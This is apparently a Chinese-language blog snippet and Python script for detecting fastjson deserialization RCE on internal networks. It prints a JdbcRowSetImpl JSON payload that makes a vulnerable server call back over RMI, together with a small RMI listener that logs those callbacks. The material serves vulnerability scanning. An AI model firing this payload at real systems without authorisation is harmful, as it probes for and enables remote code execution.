#fastjson rce检测之python版rmi服务器搭建
'''
fastjson检测rce时候，常常使用rmi协议。
如果目标通外网，payload可以使用rmi://randomstr.test.yourdomain.com:9999/path，通过dnslog来检测。
但是目标是内网，我们在内网也可以部署rmi server，通过查看日志看是否有主机的请求来检测。
Java 写一个Java的rmi服务挺简单的，但是如果你正在python开发某个项目，而又不想用调用java软件，此文章获取能帮助你。

POST data
{
	"a":{
		"@type":"java.lang.Class",
		"val":"com.sun.rowset.JdbcRowSetImpl"
	},
	"b":{
		"@type":"com.sun.rowset.JdbcRowSetImpl",
		"dataSourceName":"rmi://10.183.20.41:20008/TESTPATH"，
		"autoCommit":true
	}
}

直接贴代码
'''

#!/usr/bin/env python3

import socket
import threading
import struct

def rmi_response(client, address):
    try:
        client.settimeout(5)
        buf = client.recv(1024)
        if b"\x4a\x52\x4d\x49" in buf:
            send_data = b"\x4e"
            send_data += struct.pack(">h", len(address[0]))
            send_data += address[0].encode()
            send_data += b"\x00\x00"
            send_data += struct.pack(">H", address[1])
            client.send(send_data)

            total=3     #防止socket的recv接收数据不完整
            buf1=b""
            while total:
                buf1 += client.recv(512)
                if len(buf1)>50:
                    break
            if buf1:
                path = bytearray(buf1).split(b"\xdf\x74")[-1][2:].decode(errors="ignore")
                print("data:{}".format(buf1))
                print("client:{} send path:{}".format(address, path))
    except Exception as ex:
        print('run rmi error:{}'.format(ex))
    finally:
        client.close()

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip_port = (listenip, listenport)
    sock.bind(ip_port)
    sock.listen(max_conn)
    print("listen: {}:{} maxconnect:{}".format(listenip, listenport, max_conn))
    while True:
        client, address = sock.accept()
        thread = threading.Thread(target=rmi_response, args=(client, address))
        thread.setDaemon(True)
        thread.start()

if __name__ == '__main__':
    max_conn = 200
    listenip = "0.0.0.0"
    listenport = 20008
    main()
